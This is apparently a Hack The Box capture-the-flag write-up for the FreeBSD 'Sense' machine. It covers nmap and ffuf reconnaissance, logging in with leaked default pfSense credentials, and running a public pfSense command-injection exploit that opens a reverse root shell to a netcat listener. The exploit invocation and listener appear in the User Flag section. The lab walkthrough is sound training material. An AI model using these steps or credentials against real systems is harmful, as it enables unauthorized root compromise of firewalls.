# Sense-HTB
Sense is a FreeBSD machine that is rated as easy. This box reqiure to have some basic php skills.
# Recon
I started by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.60             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 20:43 EDT
Nmap scan report for 10.10.10.60
Host is up (0.030s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.36 seconds
```
So if we visit port 80 we get redirected to https with is port 443, and we have a login page:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Sense/images/1.png)

## ffuf
I will be using ffuf to fuze web directories.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://10.10.10.60/FUZZ                                                                                                                                 2 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.60/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

themes                  [Status: 301, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
includes                [Status: 301, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 0, Words: 1, Lines: 1]
classes                 [Status: 301, Size: 0, Words: 1, Lines: 1]
widgets                 [Status: 301, Size: 0, Words: 1, Lines: 1]
tree                    [Status: 301, Size: 0, Words: 1, Lines: 1]
shortcuts               [Status: 301, Size: 0, Words: 1, Lines: 1]
installer               [Status: 301, Size: 0, Words: 1, Lines: 1]
wizards                 [Status: 301, Size: 0, Words: 1, Lines: 1]
```
I didn't find any interesting thing so I decided to check for txt files and I found what I want:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w directory-list-2.3-medium.txt -u https://10.10.10.60/FUZZ.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.60/FUZZ.txt
 :: Wordlist         : FUZZ: directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

system-users            [Status: 200, Size: 106, Words: 9, Lines: 7]
changelog               [Status: 200, Size: 271, Words: 35, Lines: 10]
```
So ```system-users.txt``` contain a username and password:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Sense/images/2.png)

And ```changelog.txt``` states that there is one vulnerability still didn't patched:

![image3](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Sense/images/3.png)

So a simple google search will show what pfsense default password:

![image4](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Sense/images/4.png)

So the credentials are: ```rohit:pfsense```

We are in:

![image5](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Sense/images/5.png)

So from the image above we can see that the box is runing pfsense version 2.1.3. ```searchsploit``` show one exploit for it:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit pfsense 2.1.3
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                                           | php/webapps/43560.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# User Flag
So before you run the exploit make sure you start a listener:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444                                                                                                                                                                                                                    130 ⨯
listening on [any] 4444 ...
```
And now run the exploit:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/43560.py --rhost 10.10.10.60 --lhost 10.10.14.28 --lport 4444 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```
We got our shell as root :)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444                                                                                                                                                                                                                      1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.60] 37511
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
User Flag:
```
# cat user.txt
872132...7e7348b
```
# Root Flag
No need to do anything we are root :)
```
# cat root.txt
d08c32a...a69f1a86
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
